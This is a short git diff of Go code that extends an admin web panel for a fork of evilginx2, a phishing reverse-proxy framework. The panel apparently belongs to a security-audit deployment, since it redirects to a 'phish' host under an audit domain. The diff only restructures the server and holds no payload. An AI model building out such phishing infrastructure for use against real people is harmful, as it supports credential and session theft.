@@ -8,6 +8,11 @@ import (
 	"github.com/kgretzky/evilginx2/log"
 )
 
+type AdminPanel struct {
+	srv        *http.Server
+	cfg        *Config
+}
+
 func handleSessions(w http.ResponseWriter, r *http.Request) {
 	log.Debug("Starting handleSessions")
 
@@ -16,17 +21,26 @@ func handleSessions(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte("Sucess"))
 }
 
-func NewAdminServer() (*http.Server, error) {
+func NewAdminPanel(config *Config) (*AdminPanel, error) {
+	a := &AdminPanel{}
+
+	a.cfg = config
+	log.Debug("Config loaded, Domain is: " + a.cfg.baseDomain)
+
 	r := mux.NewRouter()
-	s := http.Server{
+	a.srv = &http.Server{
 		Handler:      r,
 		Addr:         ":8080",
 		WriteTimeout: 15 * time.Second,
 		ReadTimeout:  15 * time.Second,
 	}
 
-	r.Handle("/", http.RedirectHandler("http://phish.jle.csaudit.de/sessions", 302))
+	r.Handle("/", http.RedirectHandler("http://13012-jle.jle.csaudit.de:8080/sessions", 302))
 	r.HandleFunc("/sessions", handleSessions)
 
-	return &s, nil
+	return a, nil
 }
+
+func (a *AdminPanel) Start() {
+	go a.srv.ListenAndServe()
+} 
